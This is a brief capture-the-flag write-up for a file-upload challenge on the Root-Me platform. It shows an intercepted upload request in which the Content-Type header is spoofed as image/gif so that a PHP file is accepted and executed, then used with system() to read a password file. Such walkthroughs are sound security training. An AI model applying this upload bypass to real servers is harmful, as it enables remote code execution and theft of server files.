BurpSuite:

We create a random php file:
<?php
echo 0;
?>

Upload it to the web page;
We notice that the request has been blocked, just as we wanted;
In Burp, we obtain the contents of the request:
POST /web-serveur/ch21/?action=upload HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.7,en-US;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://challenge01.root-me.org/web-serveur/ch21/?action=upload
Cookie: PHPSESSID=...
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------7227795332295222081052113690
Content-Length: 240

-----------------------------7227795332295222081052113690
Content-Disposition: form-data; name=“file”; filename="truc.php”
Content-Type: application/x-php

<?php
echo 0;
?>

-----------------------------7227795332295222081052113690--
The “Content-Type: application/x-php” line is used to tell the server that the file is a php application: we modify it as follows: “Content-Type: image/gif” to make it believe that it is an image. 

We click on Forward to send the request as modified, and our file is uploaded;
We click on upload again, then on our file, and we see that our code has been executed by the server.
We repeat the operation with php code enabling us to read the contents of the .passwd file, such as the system() function enabling us to execute bash commands, and :
Well done! You can validate this challenge with the password : [...]